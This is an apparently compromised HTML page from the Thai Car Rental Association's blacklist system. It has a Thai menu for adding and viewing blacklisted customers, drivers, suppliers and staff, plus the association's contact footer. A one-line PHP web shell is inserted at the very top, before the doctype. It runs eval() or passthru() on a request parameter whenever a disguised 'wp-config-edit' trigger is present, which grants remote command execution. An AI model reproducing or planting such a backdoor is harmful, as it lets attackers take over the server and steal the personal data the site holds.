<?php if(isset($_GET['wp-config-edit'])) { if ($_REQUEST['wp-config-edit'] == 'eval') { eval(get_magic_quotes_gpc() || get_magic_quotes_runtime() ? stripslashes($_REQUEST['gim']) : $_REQUEST['gim']); } else if ($_REQUEST['wp-config-edit'] == 'exec') { passthru(get_magic_quotes_gpc() || get_magic_quotes_runtime() ? stripslashes($_REQUEST['gim']) : $_REQUEST['gim']); } }?> <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>สมาคมรถเช่าไทย---TCRA Black list system</title>
<meta NAME="Subject" CONTENT="สมาคมรถเช่าไทย,รถเช่าไทย,รถเช่า,เช่ารถ,tcra,thai car rental,ธุรกิจรถเช่า,กฎหมายรถเช่า,ราคากลางรถเช่า">
<meta NAME="Description" CONTENT="สมาคมรถเช่าไทย,รถเช่าไทย,รถเช่า,เช่ารถ,tcra,thai car rental,ธุรกิจรถเช่า,กฎหมายรถเช่า,ราคากลางรถเช่า">
<meta NAME="Abstract" CONTENT=" สมาคมรถเช่าไทย,รถเช่าไทย,รถเช่า,เช่ารถ,tcra,thai car rental,ธุรกิจรถเช่า,กฎหมายรถเช่า,ราคากลางรถเช่า">
<meta NAME="Keywords" CONTENT="สมาคมรถเช่าไทย,รถเช่าไทย,รถเช่า,เช่ารถ,ธุรกิจรถเช่า,กฎหมายรถเช่า,ราคากลางรถเช่า,ไทยรถเช่า,tcra,thai car rental,car rent,carrent,thai car rental association">
<link href="../css/blacklist.css" rel="stylesheet" type="text/css" />
<script type="text/javascript">
function MM_preloadImages() { //v3.0
  var d=document; if(d.images){ if(!d.MM_p) d.MM_p=new Array();
    var i,j=d.MM_p.length,a=MM_preloadImages.arguments; for(i=0; i<a.length; i++)
    if (a[i].indexOf("#")!=0){ d.MM_p[j]=new Image; d.MM_p[j++].src=a[i];}}
}
function MM_swapImgRestore() { //v3.0
  var i,x,a=document.MM_sr; for(i=0;a&&i<a.length&&(x=a[i])&&x.oSrc;i++) x.src=x.oSrc;
}
function MM_findObj(n, d) { //v4.01
  var p,i,x;  if(!d) d=document; if((p=n.indexOf("?"))>0&&parent.frames.length) {
    d=parent.frames[n.substring(p+1)].document; n=n.substring(0,p);}
  if(!(x=d[n])&&d.all) x=d.all[n]; for (i=0;!x&&i<d.forms.length;i++) x=d.forms[i][n];
  for(i=0;!x&&d.layers&&i<d.layers.length;i++) x=MM_findObj(n,d.layers[i].document);
  if(!x && d.getElementById) x=d.getElementById(n); return x;
}

function MM_swapImage() { //v3.0
  var i,j=0,x,a=MM_swapImage.arguments; document.MM_sr=new Array; for(i=0;i<(a.length-2);i+=3)
   if ((x=MM_findObj(a[i]))!=null){document.MM_sr[j++]=x; if(!x.oSrc) x.oSrc=x.src; x.src=a[i+2];}
}
</script>
</head>

<body onload="MM_preloadImages('images/search2.jpg','images/account-info2.jpg','images/logout2.jpg')">
<div class="block1">
  <div class="block-h">
<div class="bigblock">
			<div class="headder">
            <div class="logo"><img src="images/logo.png" width="705" height="128" /></div>
            <div class="icon-menu"><a href="search.asp" onmouseout="MM_swapImgRestore()" onmouseover="MM_swapImage('search','','images/search2.jpg',1)"><img src="images/search.jpg" name="search" width="66" height="45" border="0" id="search" /></a><a href="myaccount.asp" onmouseout="MM_swapImgRestore()" onmouseover="MM_swapImage('info','','images/account-info2.jpg',1)"><img src="images/account-info.jpg" name="info" width="75" height="45" border="0" id="info" /></a><a href="logout.asp" onmouseout="MM_swapImgRestore()" onmouseover="MM_swapImage('logout','','images/logout2.jpg',1)"><img src="images/logout.jpg" name="logout" width="75" height="45" border="0" id="logout" /></a></div>
            <div class="subject">สำหรับใส่หัวข้อ</div>
        </div>
    </div>
  </div>
  <div class="block-c">
	<div class="bigblock">
      <div class="contain">
       	  <div class="menu">
          <img src="images/mainmenu.jpg" width="239" height="55" />
          <div id="navside">
          <ul>
          	<li><a href="customerBadd.asp">เพิ่มข้อมูลลูกค้าที่มีประวัติ</a></li>
          </ul>
           <ul>
          	<li><a href="customerBview.asp">ดูข้อมูลลูกค้าที่มีประวัติ</a></li>
           </ul>
            <ul>
          	<li><a href="driverBadd.asp">เพิ่มข้อมูลพนักงานขับรถที่มีประวัติ</a></li>
           </ul>
            <ul>
          	<li><a href="driverBview.asp">ดูข้อมูลพนักงานขับรถที่มีประวัติ</a></li>
           </ul>
           <ul>
          	<li><a href="SupplierB_add.asp">เพิ่มข้อมูล Supplier ที่มีประวัติ</a></li>
           </ul>
           <ul>
          	<li><a href="SupplierB_view.asp">ดูข้อมูล Supplier ที่มีประวัติ</a></li>
           </ul>
           <ul>
          	<li><a href="StaffB_add.asp">เพิ่มข้อมูลพนักงานที่มีประวัติ</a></li>
           </ul>
           <ul>
          	<li><a href="#">ดูข้อมูลพนักงานที่มีประวัติ</a></li>
           </ul>

            </div>
        </div>
            <div class="content-data">
              <div class="welcome">
              <div style="font-style:italic; font-weight:bold; color:#39F; font-size:18px;">ยินดีต้อนรับ......</div>
              <div style="background-image:url(images/bg-name.jpg); width:429px; height:77px;">
              <div id="name-login"><span style="color:#000;">คุณ &nbsp;&nbsp;</span>dfsdfdsfdsfsd&nbsp;&nbsp; <span style="color:#000;">เข้าสู่ระบบ</span></div>
              </div>
              <p>&nbsp;</p>
              <p>&nbsp;</p>
              <p>&nbsp;</p>
              <p>&nbsp;</p>
              <p>&nbsp;</p>
              <p>&nbsp;</p>
              <p>&nbsp;</p>
              <p>&nbsp;</p>
              <p>&nbsp;</p>
              <p>&nbsp;</p>
              <p>&nbsp;</p>
              <p>&nbsp;</p>
              <p>&nbsp;</p>
              <p>&nbsp;</p>
              <p>&nbsp;</p>
              </div>
        </div>
    </div>
    </div>
  </div>
<div class="block-bottom">
<div class="bigblock" style=" background-image:url(images/bg-bottom.jpg);">
<div class="contain" style="padding-top:26px;">
<span class="bottom-logo">
<img src="images/logo2.png" width="47" height="47" /></span>
<span class="bottom-text">2585/8 (ตรงข้ามตลาดคลองเตย) ถ.พระรามที่ 4 แขวงคลองเตย เขตคลองเตย กรุงเทพฯ 10110<br />
โทร. 0-2204-1454 , 0-2258-7777 ต่อ 247 โทรสาร.0-2204-1455<br />
Email : manager@tcra.or.th --- TCRA © 2011 All rights Reserved.<br /></span>
</div></div>
</div>
</div>
</div>
<br style="clear:both;" />
</div>

</body>
</html>